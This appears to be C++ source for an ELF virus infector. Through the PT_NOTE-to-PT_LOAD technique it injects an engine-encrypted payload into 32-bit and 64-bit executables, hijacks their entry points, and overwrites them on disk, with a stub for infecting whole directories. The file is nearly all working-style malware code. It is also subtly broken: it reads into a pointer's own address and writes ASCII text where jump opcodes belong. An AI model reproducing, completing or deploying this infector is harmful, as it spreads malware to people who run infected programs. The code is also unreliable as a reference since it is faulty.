#include "infect.h"
#include "engine.h"

using namespace std;

int directory_infection(options_t *options){

  struct dirent *pDirent;

  if (VERBOSE) printf("%s: infecting all the files in the provided directory\n", INFO_BANNER );

  while ((pDirent = readdir(options->dir)) != NULL) {
    /* XXX try to infect every ELF in the directory */
  }

  closedir(options->dir);

  return EXIT_SUCCESS;
	
}

int elf_infection(options_t *options){

  	if (VERBOSE) printf("%s: infecting single ELF file\n", INFO_BANNER );

	// 1. Create payload encrypted by the engine
	char *engine_func = NULL;
	unsigned long engine_func_size = 0;

	if (VERBOSE) printf("%s creating decryption function for the payload\n", INFO_BANNER );

	engine_creation(options, &engine_func, &engine_func_size);

	if (VERBOSE) printf("%s engine_func = %s\n", INFO_BANNER, engine_func );
	if (VERBOSE) printf("%s engine_func_size = %lu\n", INFO_BANNER, engine_func_size );
	
	options->input = engine_func;
	options->inputsz = engine_func_size;

	// 2. infect ELF file with encrypted payload
  	if (VERBOSE) printf("%s: infection process beginning\n", INFO_BANNER );

	infect_elf(options);

	return EXIT_SUCCESS;

}


int infect_elf_64(options_t *options){

  	int i;
  	int old_vaddr;
  	int file_offset;
  	int patch_size = 5;
  	int pt_note_found = 1;
  	int infected_file_size;
  	int payload_len = options->inputsz;
  	char *infected_file;
  	char *patched_entry_point;
  	char *payload = options->input;
  	int32_t fd;
  	Elf64_Ehdr eh;
  	Elf64_Phdr *ph_tbl;
  	Elf64_Addr old_entry_point;

	if (VERBOSE) printf("%s ELF file is 64 bits\n", INFO_BANNER );

  	// 1. Open the ELF file to be injected:
	fd = options->elf;

	if ( read(fd, (void *)&eh, sizeof(Elf64_Ehdr)) != sizeof(Elf64_Ehdr) )
		error("read(targetelf, eh, sizeof(Elf32_Ehdr))");


	if ( eh.e_type != ET_EXEC )
		error("filetype is not ET_EXEC. cannot perform PT_NOTE infection method");

	file_offset = lseek(fd, 0, SEEK_END); // seek to end of file
	//lseek(fd, 0, SEEK_SET); // seek back to beginning of file
	if (VERBOSE) printf("%s: ELF file size (file_offset) = %d\n", INFO_BANNER, file_offset );
	if (VERBOSE) printf("%s: payload file size (payload_len) = %d\n", INFO_BANNER, payload_len );
	if (VERBOSE) printf("%s: payload file size with entry point patching = %d\n", INFO_BANNER, payload_len+patch_size );

	// 2. Save the original entry point, e_entry:
	old_entry_point = eh.e_entry;
	if (VERBOSE) printf("%s: old entry point = %lu\n", INFO_BANNER, old_entry_point );


	// 3. Parse the program header table, looking for the PT_NOTE segment:
	if ( !eh.e_phoff || !eh.e_phnum )
		error("ELF file has no program header table");

	if ( lseek(fd, (off_t)eh.e_phoff, SEEK_SET) != (off_t)eh.e_phoff ) 
		error("lseek(targetelf, eh.e_shoff, SEEK_SET);\n");

	ph_tbl = (Elf64_Phdr *) malloc( eh.e_phentsize * eh.e_phnum );

	if (ph_tbl == NULL)
		error("could't allocate memory to read ELF program headers");

	for( i = 0; i < eh.e_phnum && pt_note_found; i++ ){
		if (read(fd, (void *)&ph_tbl[i], eh.e_phentsize) != eh.e_phentsize)
			error("read(targetelf, sh_table[i], eh.e_shentsize)");

		if ( ph_tbl[i].p_type != PT_NOTE )
			continue;

		if (VERBOSE){
			printf("%s: found PT_NOTE segment\n", INFO_BANNER );
			printf("\tp_type = %d\n", ph_tbl[i].p_type);	
			printf("\tp_flags = %d\n", ph_tbl[i].p_flags);
			printf("\tp_vaddr = %lu\n", ph_tbl[i].p_vaddr);
			printf("\tp_filesz = %lu\n", ph_tbl[i].p_filesz);
			printf("\tp_memsz = %lu\n", ph_tbl[i].p_memsz);
			printf("\tp_offset = %lu\n", ph_tbl[i].p_offset);
		} 

		pt_note_found = 0;

		// 4. Convert the PT_NOTE segment to a PT_LOAD segment:
		ph_tbl[i].p_type = PT_LOAD;

		// 5. Change the memory protections for this segment to allow executable instructions:
		ph_tbl[i].p_flags = PF_R | PF_X;

		// 6. Change the entry point address to an area that will not conflict with the original program execution.
		eh.e_entry = (Elf64_Addr) 0xc000000 + file_offset;
	
		// 7. Adjust the size on disk and virtual memory size to account for the size of the injected code:
		old_vaddr = ph_tbl[i].p_vaddr;
		ph_tbl[i].p_vaddr = (Elf32_Addr) 0xc000000 + file_offset;
		ph_tbl[i].p_filesz += (Elf32_Word) payload_len + patch_size;
		ph_tbl[i].p_memsz += (Elf32_Word) payload_len + patch_size;

		// 8. Point the offset of our converted segment to the end of the original binary, where we will store the new code:
		ph_tbl[i].p_offset = file_offset;
	}

	if (VERBOSE){
			printf("%s: modified PT_NOTE segment\n", INFO_BANNER );
			printf("\tp_type = %d\n", ph_tbl[i].p_type);	
			printf("\tp_flags = %d\n", ph_tbl[i].p_flags);
			printf("\tp_vaddr = %lu\n", ph_tbl[i].p_vaddr);
			printf("\tp_filesz = %lu\n", ph_tbl[i].p_filesz);
			printf("\tp_memsz = %lu\n", ph_tbl[i].p_memsz);
			printf("\tp_offset = %lu\n", ph_tbl[i].p_offset);
		} 

	infected_file_size = payload_len + file_offset + patch_size;
	infected_file = (char *) malloc((size_t) infected_file_size );

	if (infected_file == NULL)
		error("couldn't allocate memory for new infected ELF file");

	if ( lseek(fd, (off_t)0, SEEK_SET) != (off_t)0 ) 
		error("lseek(targetelf, 0, SEEK_SET);\n");

	if ( read(fd, (void *)&infected_file, file_offset) != file_offset )
		error("read(targetelf, eh, sizeof(Elf32_Ehdr))");


	// 10. Add our injected code to the end of the file:
	memcpy(infected_file+file_offset, payload, payload_len);


	// 9. Patch the end of the code with instructions to jump to the original entry point:
	patched_entry_point = (char *) malloc(patch_size);
	if (patched_entry_point == NULL)
		error("couldn't allocate memory for the patch isntruction");

	sprintf(patched_entry_point, "0xe9%lu", (old_entry_point-old_vaddr-patch_size-payload_len));
	memcpy(infected_file+file_offset+payload_len, patched_entry_point, patch_size);
	if (VERBOSE) printf("%s: entry point patching code = %s\n", INFO_BANNER, patched_entry_point );

	// 11. Write the file back to disk, over the original file:
	if ( lseek(fd, (off_t)0, SEEK_SET) != (off_t)0 ) 
		error("lseek(targetelf, 0, SEEK_SET);\n");
	write(fd, infected_file, infected_file_size );

	return EXIT_SUCCESS;
}

int infect_elf(options_t *options){

  	Elf32_Ehdr eh;
  	Elf32_Phdr *ph_tbl;
  	Elf32_Addr old_entry_point;
  	int payload_len = options->inputsz;
  	char *payload = options->input;
  	int file_offset;
  	int32_t fd;
  	int pt_note_found = 1;
  	int patch_size = 8;
  	int infected_file_size;
  	char *infected_file;
  	char *patched_entry_point;
  	int old_vaddr;
  	int i,j;



  	// 1. Open the ELF file to be injected:
	fd = options->elf;

	if ( lseek(fd, (off_t)0, SEEK_SET) != (off_t)0 ) 
		error("lseek(targetelf, 0, SEEK_SET);\n");

	if ( read(fd, (void *)&eh, sizeof(Elf32_Ehdr)) != sizeof(Elf32_Ehdr) )
		error("read(targetelf, eh, sizeof(Elf32_Ehdr))");

	if ( strncmp( (char*)eh.e_ident, ELF_MAGIC_NUMBER, 4 ) )
		error("target elf is not an ELF file.");

	if ( eh.e_ident[EI_CLASS] == ELFCLASS64 )
		return infect_elf_64(options);

	if (VERBOSE) cout << INFO_BANNER << ": ELF file is 32 bits\n";

	if ( eh.e_type != ET_EXEC )
		error("filetype is not ET_EXEC. cannot perform PT_NOTE infection method");

	file_offset = lseek(fd, 0, SEEK_END); // seek to end of file
	//lseek(fd, 0, SEEK_SET); // seek back to beginning of file
	if (VERBOSE) cout << INFO_BANNER << ": ELF file size (file_offset) = " << file_offset << endl;
	if (VERBOSE) cout << INFO_BANNER << ": payload file size (payload_len) = " << payload_len << endl;
	if (VERBOSE) cout << INFO_BANNER << ": payload file size with entry point patching = " << payload_len+patch_size << endl;

	// 2. Save the original entry point, e_entry:
	old_entry_point = eh.e_entry;
	if (VERBOSE) cout << INFO_BANNER << ": old entry point = " << old_entry_point << endl;


	// 3. Parse the program header table, looking for the PT_NOTE segment:
	if ( !eh.e_phoff || !eh.e_phnum )
		error("ELF file has no program header table");

	if ( lseek(fd, (off_t)eh.e_phoff, SEEK_SET) != (off_t)eh.e_phoff ) 
		error("lseek(targetelf, eh.e_shoff, SEEK_SET);\n");

	//ph_tbl = (Elf32_Phdr *) malloc( eh.e_phentsize * eh.e_phnum );
	ph_tbl = new Elf32_Phdr[eh.e_phentsize * eh.e_phnum];


	if (ph_tbl == NULL)
		error("could't allocate memory to read ELF program headers");

	for( i = 0; i < eh.e_phnum && pt_note_found; i++ ){
		if (read(fd, (void *)&ph_tbl[i], eh.e_phentsize) != eh.e_phentsize)
			error("read(targetelf, sh_table[i], eh.e_shentsize)");

		if ( ph_tbl[i].p_type != PT_NOTE )
			continue;

		if (VERBOSE){
			 cout << INFO_BANNER << ": found PT_NOTE segment\n";
			 cout << "\tp_type = " << ph_tbl[i].p_type << endl;	
			 cout << "\tp_flags = " << ph_tbl[i].p_flags << endl;
			 cout << "\tp_vaddr = " << ph_tbl[i].p_vaddr << endl;
			 cout << "\tp_filesz = " << ph_tbl[i].p_filesz << endl;
			 cout << "\tp_memsz = " << ph_tbl[i].p_memsz << endl;
			 cout << "\tp_offset = " << ph_tbl[i].p_offset << endl;
		} 

		j = i;

		pt_note_found = 0;

		// 4. Convert the PT_NOTE segment to a PT_LOAD segment:
		ph_tbl[i].p_type = PT_LOAD;

		// 5. Change the memory protections for this segment to allow executable instructions:
		ph_tbl[i].p_flags = PF_R | PF_X;

		// 6. Change the entry point address to an area that will not conflict with the original program execution.
		eh.e_entry = (Elf64_Addr) 0xc000000 + file_offset;
	
		// 7. Adjust the size on disk and virtual memory size to account for the size of the injected code:
		old_vaddr = ph_tbl[i].p_vaddr;
		ph_tbl[i].p_vaddr = (Elf32_Addr) 0xc000000 + file_offset;
		ph_tbl[i].p_filesz += (Elf32_Word) payload_len + patch_size;
		ph_tbl[i].p_memsz += (Elf32_Word) payload_len + patch_size;

		// 8. Point the offset of our converted segment to the end of the original binary, where we will store the new code:
		ph_tbl[i].p_offset = file_offset;
	}

	if (VERBOSE){
		cout << INFO_BANNER << ": found PT_NOTE segment\n";
		cout  << "\tp_type = " << ph_tbl[j].p_type << endl;	
		cout << "\tp_flags = " << ph_tbl[j].p_flags << endl;
		cout << "\tp_vaddr = " << ph_tbl[j].p_vaddr << endl;
		cout << "\tp_filesz = " << ph_tbl[j].p_filesz << endl;
		cout << "\tp_memsz = " << ph_tbl[j].p_memsz << endl;
		cout << "\tp_offset = " << ph_tbl[j].p_offset << endl;
		cout << INFO_BANNER << ": new entry point = " << eh.e_entry << endl;
	} 

	infected_file_size = payload_len + file_offset + patch_size;
	//infected_file = (char *) malloc((size_t) infected_file_size );
	infected_file = new char[infected_file_size];

	if (VERBOSE) cout << INFO_BANNER << "infected_file allocated mem = " << sizeof(infected_file) << endl;

	if (infected_file == NULL)
		error("couldn't allocate memory for new infected ELF file");

	if ( lseek(fd, (off_t)0, SEEK_SET) != (off_t)0 ) 
		error("lseek(targetelf, 0, SEEK_SET);\n");

	int resul = read(fd, (void *)&infected_file, file_offset);
	if (VERBOSE) cout << INFO_BANNER << "read() syscall return value = " << resul << endl;
	if (  resul != file_offset )
		error("read(targetelf, eh, sizeof(Elf32_Ehdr))");

	for (int i = 0; i < file_offset; ++i)
	{
		//cout << infected_file[i] << " ";
	}
	cout << endl;


	// 10. Add our injected code to the end of the file:
	if (VERBOSE) cout << INFO_BANNER << ": injecting code to end of ELF" << endl;
	if (VERBOSE) cout << INFO_BANNER << "infected_file = " << &infected_file << endl;
	if (VERBOSE) cout << INFO_BANNER << "infected_file + file_offset = " << *infected_file+file_offset << endl;
	/*
	if (VERBOSE) cout << INFO_BANNER << "infected_file = " << infected_file << endl;
	*/
	memcpy(infected_file+file_offset, payload, payload_len);
	if(VERBOSE) cout << INFO_BANNER << ": injected code to end of ELF" << endl;



	// 9. Patch the end of the code with instructions to jump to the original entry point:
	patched_entry_point = (char *) malloc(patch_size);
	if (patched_entry_point == NULL)
		error("couldn't allocate memory for the patch isntruction");

	sprintf(patched_entry_point, "0x68%c0xff0x240x24", (old_entry_point-old_vaddr-patch_size-payload_len));
	memcpy(infected_file+file_offset+payload_len, patched_entry_point, patch_size);
	if (VERBOSE) cout << INFO_BANNER << ": entry point patching code = " << patched_entry_point << endl;

	// 11. Write the file back to disk, over the original file:
	if ( lseek(fd, (off_t)0, SEEK_SET) != (off_t)0 ) 
		error("lseek(targetelf, 0, SEEK_SET);\n");
	write(fd, infected_file, infected_file_size );

	delete[] ph_tbl;
	delete[] infected_file;

	return EXIT_SUCCESS;
}